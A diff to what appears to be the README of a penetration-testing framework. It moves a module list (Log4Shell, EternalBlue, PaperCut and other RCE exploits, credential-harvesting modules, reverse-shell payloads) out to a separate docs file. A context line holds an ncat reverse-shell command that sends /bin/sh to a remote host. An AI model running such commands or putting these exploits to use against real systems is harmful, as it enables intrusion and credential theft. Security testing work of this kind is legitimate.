@@ -176,47 +176,7 @@ ncat 10.0.0.5 9001 -e /bin/sh
 
 ## Modules
 
-### Exploits (6)
-
-| Module | Description |
-|---|---|
-| Apache Log4j RCE (Log4Shell) | Exploits CVE-2021-44228 via JNDI injection in the Log4j logging library. Spins up an internal LDAP and HTTP server to deliver a Java payload and catch a reverse shell. Affects Log4j 2.0-beta9 through 2.14.1. |
-| Erlang/OTP SSH Pre-Auth RCE (CVE-2025-32433) | Pre-authentication RCE in Erlang's native SSH server. Exploits a missing authentication state check to send SSH_MSG_CHANNEL_REQUEST before auth completes, executing arbitrary Erlang code via os:cmd(). CVSS 10.0. |
-| MS17-010 EternalBlue SMB RCE | Exploits the NSA's EternalBlue vulnerability in Windows SMBv1. Sends crafted SMB1 transactions to trigger a buffer overflow and gain SYSTEM-level code execution. Dual-path implementation for Windows 7 and Windows 8+. |
-| Multi Handler | Generic reverse payload listener. Binds a port and waits for incoming connections from any reverse shell payload, registering them as interactive sessions. |
-| PaperCut MF/NG Auth Bypass RCE (CVE-2023-27350) | Unauthenticated RCE in PaperCut print management software via the SetupCompleted authentication bypass chained with print script injection. Executes arbitrary commands as NT AUTHORITY\SYSTEM on Windows. CVSS 9.8. |
-| React Server Components RCE (React2Shell / CVE-2025-55182) | Pre-auth RCE in React Server Components. Exploits insecure deserialization in the RSC Flight protocol to pollute Promise.prototype and execute arbitrary JavaScript server-side via Node.js. CVSS 10.0. |
-
-### Auxiliary Modules (1)
-
-| Module | Description |
-|---|---|
-| SimpleHelp Path Traversal File Read (CVE-2024-57727) | Unauthenticated arbitrary file read in SimpleHelp remote support software <= 5.5.7. Exploits a path traversal flaw in the /toolbox-resource/ endpoint via raw TCP to preserve ../ sequences. Iterates 16 valid subdirectory names to cover both Windows and Linux targets without OS detection. Automatically parses and highlights credentials from serverconfig.xml. CVSS 7.5. |
-
-### Auxiliary Scanners (16)
-
-FTP, HTTP directory, HTTP auth brute, IMAP, LDAP, Memcached, MySQL, POP3, port scan, Redis, SMB version, SMTP, SSH, Telnet, VNC, Elasticsearch.
-
-### Post-Exploitation (2)
-
-| Module | Description |
-|---|---|
-| `linux_creds` | Gather credentials from common file locations |
-| `linux_enum_system` | System enumeration (users, network, processes) |
-
-### Payloads (9)
-
-| Payload | Platform |
-|---|---|
-| Bash Reverse TCP | Linux/BSD |
-| Netcat Reverse TCP | Linux/BSD |
-| Perl Reverse TCP | Linux/BSD |
-| Ruby Reverse TCP | Linux/BSD |
-| Python Reverse TCP | Cross-platform |
-| PHP Reverse TCP | Cross-platform |
-| PowerShell Reverse TCP | Windows |
-| Linux x64 Reverse TCP | Linux (binary) |
-| Linux x64 Bind TCP | Linux (binary) |
+For detailed module documentation, see [docs/MODULES.md](docs/MODULES.md).
 
 ---
 
